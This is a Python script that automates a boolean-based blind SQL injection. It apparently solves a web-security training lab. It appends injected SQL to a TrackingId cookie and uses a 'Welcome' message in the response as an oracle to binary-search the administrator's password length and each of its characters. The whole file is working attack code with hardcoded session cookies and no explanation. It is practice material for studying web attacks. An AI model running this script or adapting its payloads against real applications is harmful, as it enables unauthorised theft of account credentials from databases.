from scripts.config import BURP_PROXIES
import requests
import argparse
import urllib
import urllib3
import copy


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def guess_char(
    url: str, idx: int, ascii_left_bound: int, ascii_right_bound: int, cookies: dict
) -> int:
    guess = (ascii_left_bound + ascii_right_bound) // 2

    sqli_template = "' and (select ascii(substring(password,{0},1)) from users where username='administrator') {1} '{2}'-- "

    payload = sqli_template.format(idx, "=", guess)

    payload_encoded = urllib.parse.quote(payload)

    modifed_cookies = copy.deepcopy(cookies)
    modifed_cookies["TrackingId"] += payload_encoded

    r = requests.get(url, cookies=modifed_cookies, verify=False, proxies=BURP_PROXIES)

    if "Welcome" in r.text:
        return guess
    else:
        payload = sqli_template.format(idx, ">", guess)
        payload_encoded = urllib.parse.quote(payload)

        modifed_cookies = copy.deepcopy(cookies)
        modifed_cookies["TrackingId"] += payload_encoded

        r = requests.get(
            url, cookies=modifed_cookies, verify=False, proxies=BURP_PROXIES
        )

        if "Welcome" in r.text:
            return guess_char(url, idx, guess, ascii_right_bound, cookies)
        else:
            return guess_char(url, idx, ascii_left_bound, guess, cookies)


def guess_password_length(
    url: str, min_length: int, max_length: int, cookies: dict
) -> int:

    guess = (min_length + max_length) // 2

    sqli_template = "' and (select LENGTH(password) from users where username='administrator') {0} '{1}'-- "

    payload = sqli_template.format("=", guess)
    payload_encoded = urllib.parse.quote(payload)

    modifed_cookies = copy.deepcopy(cookies)
    modifed_cookies["TrackingId"] += payload_encoded

    r = requests.get(url, cookies=modifed_cookies, verify=False, proxies=BURP_PROXIES)

    if "Welcome" in r.text:
        return guess
    else:
        payload = sqli_template.format(">", guess)
        payload_encoded = urllib.parse.quote(payload)

        modifed_cookies = copy.deepcopy(cookies)
        modifed_cookies["TrackingId"] += payload_encoded

        r = requests.get(
            url, cookies=modifed_cookies, verify=False, proxies=BURP_PROXIES
        )

        if "Welcome" in r.text:
            return guess_password_length(url, guess, max_length, cookies)
        else:
            return guess_password_length(url, min_length, guess, cookies)


if __name__ == "__main__":

    cookies = {
        "TrackingId": "Hb29FSySTddGlDjG",
        "session": "wu3EntM6P8uN5Kfi9O2WAC4MTDjmfaF8",
    }

    parser = argparse.ArgumentParser(
        description="Brute force password length and value"
    )
    parser.add_argument("-u", "--url", help="URL of the target")
    args = parser.parse_args()

    print("Guessing a password length between 1-30.........")
    password_length = guess_password_length(args.url, 1, 30, cookies)
    print("Found password length: ", password_length)

    print("Guessing the password value.........")
    password = ""
    for i in range(1, password_length + 1):
        char = guess_char(args.url, i, 32, 126, cookies)
        password += chr(char)
    print("Password found: ", password)
